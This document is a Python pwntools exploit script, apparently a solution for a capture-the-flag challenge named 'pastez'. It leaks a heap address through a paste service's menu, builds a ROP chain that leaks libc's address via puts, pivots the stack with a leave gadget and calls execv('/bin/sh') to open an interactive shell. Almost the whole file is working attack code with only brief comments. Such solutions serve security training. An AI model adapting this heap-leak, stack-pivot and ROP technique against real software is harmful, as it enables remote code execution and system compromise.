import argparse

from pwn import *

parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8000", help="Address of challenge")


args = parser.parse_args()

HOST, PORT = args.address.split(':')

r = remote(HOST, int(PORT))
e = ELF('../../../handouts/pastez/handout/challenge')
rop = ROP(e)

r.recvuntil(b': ')  # menu
r.sendline(b'2')  # create
r.recvuntil(b': ')
r.send(b'M1'*128)

r.recvuntil(b': ')  # menu
r.sendline(b'2')  # create
r.recvuntil(b': ')
r.send(b'M2'*128)

r.recvuntil(b': ')  # menu
r.sendline(b'1')

r.recvuntil(b': ')  # start of M2M2M2...
r.recvn(256)
heap = u64(r.recvuntil(b'\n')[:-1].ljust(8, b'\x00'))
print(f"{heap=:08x}")

r.recvuntil(b'): ')
r.sendline(b'0')  # exit to main menu

# Cleanup those messages now that we have the addr...
r.recvuntil(b': ')  # menu
r.sendline(b'1')
r.recvuntil(b'): ') # pick id
r.sendline(b'1') # id 1
r.recvuntil(b': ')
r.sendline(b'2') # delete

r.recvuntil(b': ')  # menu
r.sendline(b'1')
r.recvuntil(b'): ') # pick id
r.sendline(b'1') # id 1
r.recvuntil(b': ')
r.sendline(b'2') # delete

pivot = heap

# ... and now build up the ROP chain.
# It's not necessary to delete M1/M2 above (you can just statically offset from the leaked addr)
# but this is a bit cleaner.
r.recvuntil(b': ')  # menu
r.sendline(b'2')  # create
r.recvuntil(b': ')
chain = b''
# Dump out addr of libc free to leak
chain += p64(rop.rdi.address) + p64(e.got['free'])
chain += p64(e.plt['puts'])
# Read stdin to continue chain now that we know libc
chain += p64(rop.rdi.address) + p64(0)
chain += p64(rop.rsi.address) + p64(pivot + 0x58)  # end of chain
chain += p64(rop.rdx.address) + p64(0x100)
chain += p64(e.plt['read'])
assert b' ' not in chain, hex(chain.index(b' '))
r.send(chain)

r.recvuntil(b': ')  # menu
r.sendline(b'2')  # create
r.recvuntil(b': ')
msg = b'hack ' * 20  # expands to 200 bytes
msg += b'B' * (256 - 200)
msg += b'C' * 0x30  # padding to saved bp
msg += p64(pivot)
msg += p64(rop.leave.address)
msg += b'D' * (256 - len(msg))
r.send(msg)

r.recvuntil(b': ')  # menu

libc_offset = u64(r.recvuntil(b'\n')[:-1].ljust(8, b'\x00'))
print(f"{libc_offset=:08x}")
libc = ELF('../../../handouts/pastez/handout/libc.so.6')
libc.address = libc_offset - libc.symbols['free']
print(f"{libc.address=:08x}")
assert libc.address & 0xfff == 0

# Chain continues at pivot + 0x58
pivot += len(chain) + 8

chain = b''
chain += p64(rop.rdi.address) + p64(pivot + 0x28)
chain += p64(rop.rsi.address) + p64(pivot + 0x30)
chain += p64(libc.symbols['execv'])  # execv so we don't have to figure out a larger stack
chain += b'/bin/sh\x00'
chain += p64(pivot + 0x28) + p64(0)
r.send(chain)

r.interactive()
